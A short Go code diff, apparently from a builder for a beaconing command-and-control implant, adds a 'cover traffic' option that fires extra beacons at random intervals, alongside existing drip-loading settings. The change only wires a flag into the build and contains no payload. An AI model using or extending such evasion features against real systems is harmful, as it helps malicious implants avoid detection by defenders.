@@ -81,6 +81,8 @@ type BuildConfig struct {
 	// L2-5: Drip-loading chunk size (bytes) and delay between chunks (ms)
 	DripChunkSize int `json:"drip_chunk_size"`
 	DripDelayMs   int `json:"drip_delay_ms"`
+	// L2-6: Cover traffic — fire extra beacons at random sub-intervals
+	CoverTraffic bool `json:"cover_traffic"`
 }
 
 // ── Build functions ───────────────────────────────────────────────────────────
@@ -920,6 +922,10 @@ func buildLDFlags(cfg BuildConfig) string {
 	if cfg.DripChunkSize > 0 {
 		add("DripChunkSize", fmt.Sprintf("%d", cfg.DripChunkSize))
 		add("DripDelayMs", fmt.Sprintf("%d", cfg.DripDelayMs))
+	}
+	// L2-6: Cover traffic
+	if cfg.CoverTraffic {
+		add("CoverTraffic", "true")
 	}
 	return strings.Join(flags, " ")
 }
